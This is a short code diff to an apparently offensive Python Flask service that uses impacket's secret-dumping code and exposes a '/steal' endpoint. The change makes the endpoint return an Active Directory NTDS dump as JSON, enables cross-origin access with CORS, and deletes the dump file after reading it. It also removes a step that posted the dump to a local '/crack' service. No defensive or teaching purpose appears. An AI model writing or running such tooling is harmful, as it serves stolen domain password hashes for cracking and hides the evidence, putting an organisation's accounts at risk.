@@ -19,6 +19,7 @@ from impacket.krb5.keytab import Keytab
 import time
 from flask import Flask
 from flask import request
+from flask_cors import CORS
 
 import hashlib,binascii
 try:
@@ -47,7 +48,7 @@ class DumpSecrets():
 
 
 app = Flask(__name__)
-
+CORS(app)
 
 
 @app.route("/steal", methods=['POST'])
@@ -67,18 +68,16 @@ def stealData():
    
     # read addump.ntds file
     with open('addump.ntds', 'rb') as f:
-        ntds = f.read()
-        return ntds
+        ntds = f.read().decode("utf-8")
+  
+    # delete addump.ntds file
+    os.remove('addump.ntds')
 
-        
-        # send the data with a post request to localhost:8081
-        r = requests.post('http://localhost:8081/crack', data={'dump': ntds})
+    return {"data": ntds}
 
 
-        # return the response
-        return r.text
 
-        
+
     
 
 if __name__ == "__main__":
